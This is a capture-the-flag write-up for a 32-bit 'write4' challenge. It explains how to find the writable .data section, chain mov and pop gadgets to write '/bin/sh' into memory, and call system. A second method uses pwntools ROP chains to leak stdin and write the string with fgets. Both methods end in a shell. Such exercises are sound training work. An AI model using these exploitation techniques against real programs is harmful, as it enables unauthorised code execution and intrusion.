# write4 - 32bit

### gadget exploit

This challenge involves us using gadgets to write data onto the stack.

Checking areas we can write to can be achieved with this command:
```
$ readelf --sections write432

There are 31 section headers, starting at offset 0x196c:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000030 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481dc 0001dc 0000d0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080482ac 0002ac 000081 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0804832e 00032e 00001a 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048348 000348 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048368 000368 000020 08   A  5   0  4
  [10] .rel.plt          REL             08048388 000388 000038 08  AI  5  24  4
  [11] .init             PROGBITS        080483c0 0003c0 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483f0 0003f0 000080 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048470 000470 000008 00  AX  0   0  8
  [14] .text             PROGBITS        08048480 000480 000262 00  AX  0   0 16
  [15] .fini             PROGBITS        080486e4 0006e4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080486f8 0006f8 000064 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        0804875c 00075c 00003c 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048798 000798 00010c 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000028 04  WA  0   0  4
  [25] .data             PROGBITS        0804a028 001028 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a040 001030 00002c 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 001030 000034 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 001861 00010a 00      0   0  1
  [29] .symtab           SYMTAB          00000000 001064 000510 10     30  50  4
  [30] .strtab           STRTAB          00000000 001574 0002ed 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```

Looking through this for an area gives us the best candidate:

```
[25] .data             PROGBITS        0804a028 001028 000008 00  WA  0   0  4
```

We can then check if the `.data` section is empty with the command below:

```
$ readelf -x .data write432

Hex dump of section '.data':
  0x0804a028 00000000 00000000                   ........
```

Nothing currently resides in `.data`. This, therefore, makes it the perfect candidate for out date injection.

The next step is to look for some gadgets to move data into this memory address. We are looking for a `mov [<REG>], [REG]` gadget that will allow us
to move data into an address of our choice.

The chosen gadget is below:
```
0x08048670 : mov dword ptr [edi], ebp ; ret
```

This then means if we find some `pop` gadgets for `edi` and `ebp` we can add data to the location of our choice.
`edi` will hold the memory location of `.data` and `ebp` the string to write.

Putting this all together allows us to create a helper method used to write 4 bytes of a string in one call

```python
def write_string_to_memory(start_addr, string_data, g_pop, g_mov):

    # Pads the string
    required = abs((len(string_data) % 4) - 4)
    string_data += " " * required

    # Split the string into sets of 4
    chunks = re.findall(r"....", string_data)

    # Writes data to memory
    payload = b""
    for c in chunks:
        payload += g_pop
        payload += p32(start_addr)
        payload += str.encode(c)
        payload += g_mov

        # Increment the address each time
        start_addr += 4

    return payload
```

This then enables us to craft the payload dynamically using the gadgets.

To finish off the exploit, a call to system is used with the start location of the string.

Overall the payload is formed like so:

```python
payload = b""
payload += junk # x 44
payload += write_string_to_memory(string_location, "/bin/sh", g_pop_pop, g_mov) 
payload += system_func
payload += p32(0x90) # exit addr
payload += p32(string_location)
```

### fgets exploit

Another way to exploit this binary is via a `fgets` call. This allows us to write data via `stdin` to a specified location.
The exploit will also utilise `pwntools` ROP functionality to easily craft an exploit.

First the exploit grabs important addresses from the `elf`. Note: the `.data` address is obtained in exactly the same way as the previous exploit.

```python
printf  = e.symbols[b"printf"]
main    = e.symbols[b"main"]
stdin   = e.symbols[b"stdin"]
fgets   = e.symbols[b"fgets"]
buffer_mem = 0x0804a028 #.data
```

Our first ROP chain will use the `printf` address to leak the location of `stdin`.

This is achieved like so:
```python
rop = ROP(e)
rop.call(printf, (stdin,))
rop.call(main, (0,0,0,))
payload = (b"\x41" * BUFFER_LEN) + rop.chain()
p.sendline(payload)
```

And the leaked address is obtained with:
```python
data = p.recv()
stdin_buf = unpack(data[0:4])
```

This then leads to out second chain where we can send data via `stdin` that will then be placed into our desired memory location.


Our second chain starts like so:

```python
rop = ROP(e)
rop.call(fgets, (buffer_mem, 0x15, stdin_buf,))
rop.call(main, (0,0,0,))
payload = (b"\x41" * BUFFER_LEN) + rop.chain()
p.sendline(payload)
```

Then anything send via `stdin` will be placed in the `buffer_mem` location.

```python
p.sendline("/bin/sh")
```

Our final chain will then use the local `system` address to call the memory location of our string.

```python
rop = ROP(e)
rop.system(buffer_mem)
payload = (b"\x41" * BUFFER_LEN) + rop.chain()
p.sendline(payload)
```

Then calling `p.interactive()` will provide us a shell!